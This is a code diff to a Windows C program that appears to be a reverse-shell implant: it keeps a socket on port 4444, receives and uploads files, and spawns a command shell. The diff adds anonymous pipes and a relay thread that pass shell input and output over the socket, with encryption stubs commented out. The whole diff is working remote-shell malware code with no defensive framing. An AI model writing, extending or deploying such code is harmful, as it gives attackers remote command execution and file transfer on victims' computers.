@@ -16,8 +16,12 @@ int startup();
 void recieve();
 void upload();
 void ping();
+void sendPipe();
+void recvPipe();
 int port = 4444;
 SOCKET sockt; //global sockt
+HANDLE ChildStd_IN_Rd, ChildStd_IN_Wr, ChildStd_OUT_Rd, ChildStd_OUT_Wr = NULL;
+
 int main() {
 	//trail();
 	
@@ -92,6 +96,59 @@ void ping() { //simply for testing
 		printf("sent item");
 	}
 }
+
+DWORD WINAPI shellPipe(LPVOID lPparam) {
+	printf("entered thread");
+	for (;;) {
+		sendPipe();
+		recvPipe();
+
+	}
+	return 0;
+}
+
+void sendPipe() { //FUNC TO WRITE TO SOCKET HANDLE
+	DWORD dwRead, dwWritten;
+	DWORD bytesavail = 0;
+	char buff[MAX_READ];
+	ZeroMemory(buff, sizeof(buff));
+	BOOL bSuccess = FALSE;
+	char encrypted[DEFAULT_BUFLEN];
+	for (;;) {
+		PeekNamedPipe(ChildStd_OUT_Rd, NULL, 0, NULL, &bytesavail, 0);
+		if (bytesavail) {
+			bSuccess = ReadFile(ChildStd_OUT_Rd, buff, sizeof(buff), &dwRead, NULL);
+			if (!bSuccess || dwRead == 0) break; //no data read or read failed
+			//int bytesencrypt = encrypt(buff, dwRead, encrypted); //encrypt data
+			bSuccess = WriteFile((HANDLE)sockt, buff, dwRead, &dwWritten, NULL);
+		}
+		else break;
+	}
+	
+}
+
+void recvPipe() { //FUNC FOR READING FROM SOCKET HANDLE
+	DWORD  dwRead, dwWritten;
+	DWORD bytesavail = 0;
+	char buff[DEFAULT_BUFLEN];
+	ZeroMemory(buff, sizeof(buff));
+	BOOL bSuccess = FALSE;
+	char decrypted[MAX_READ];
+	for (;;) {
+		ioctlsocket(sockt, FIONREAD, &bytesavail);
+		if (bytesavail) {
+			bSuccess = ReadFile((HANDLE)sockt, buff, sizeof(buff), &dwRead, NULL);
+			if (!bSuccess || dwRead == 0) break; //if no data is read or readfile fails then break
+
+			//int bytesdecrypt = decrypt(buff, dwRead, decrypted); //decrypt input
+			//printf(buff);
+			//printf("\n");
+			bSuccess = WriteFile(ChildStd_IN_Wr, buff, dwRead, &dwWritten, NULL);
+		}
+		else
+			break;
+	}
+}
 void CreateShell(int port) {
 		STARTUPINFO ini_processo;
 		PROCESS_INFORMATION processo_info;
@@ -100,16 +157,49 @@ void CreateShell(int port) {
 
 		ini_processo.cb = sizeof(ini_processo);
 		ini_processo.dwFlags = (STARTF_USESTDHANDLES);
-		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)sockt; //sets handles of process to the socket
 
+		/*
+		pipe creation
+		*/
+		SECURITY_ATTRIBUTES saAttr;
+		saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+		saAttr.bInheritHandle = TRUE;
+		saAttr.lpSecurityDescriptor = NULL;
+
+		if (!CreatePipe(&ChildStd_OUT_Rd, &ChildStd_OUT_Wr, &saAttr, 0)) {
+			exit("failed pipe one");
+		}
+		if (!CreatePipe(&ChildStd_IN_Rd, &ChildStd_IN_Wr, &saAttr, 0)) {
+			exit("failed pipe two");
+		}
+
+		ini_processo.hStdInput = ChildStd_IN_Rd;
+		ini_processo.hStdOutput = ChildStd_OUT_Wr;
+		ini_processo.hStdError = ChildStd_OUT_Wr; //sets handles of process to pipes
+
+
+		//thread startup
+		HANDLE hThread;
+		DWORD dwThreadId;
 		CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info); //create shell
+		hThread = CreateThread(NULL, 0, shellPipe, NULL, 0, &dwThreadId);
+		if (hThread == NULL)
+			exit("thread failed");
 		WaitForSingleObject(processo_info.hProcess, INFINITE); //wait for user to close shell on their end
 
-		//cleanup of threads
-		CloseHandle(processo_info.hThread);
+
+		//cleanup of pipes
+		CloseHandle(ChildStd_IN_Rd);
+		CloseHandle(ChildStd_IN_Wr);
+		CloseHandle(ChildStd_OUT_Wr);
+		CloseHandle(ChildStd_OUT_Rd);
+
+		CloseHandle(hThread); //ends thread
+
+		CloseHandle(processo_info.hThread); //cleanups process
 		CloseHandle(processo_info.hProcess);
 	
-}
+} 
 int startup() {
 	WSADATA wsa;
 	struct sockaddr_in revsockaddr;
@@ -184,7 +274,9 @@ void recieve() {
 		printf("in while loop\n");
 		printf("%d / %d byes recieved\n", recvbytes, totalbytes);
 		RecvCode = recv(sockt, RecvData, DEFAULT_BUFLEN, 0);
-		int bytesrecv = decrypt(RecvData, RecvCode, buffer);
+
+		//decrypts data in RecvData and saves to buffer
+		int bytesrecv = decrypt(RecvData, RecvCode, buffer); 
 		printf("bytes recieved %d \n", bytesrecv);
 
 		fwrite(buffer, bytesrecv, 1, ptr);
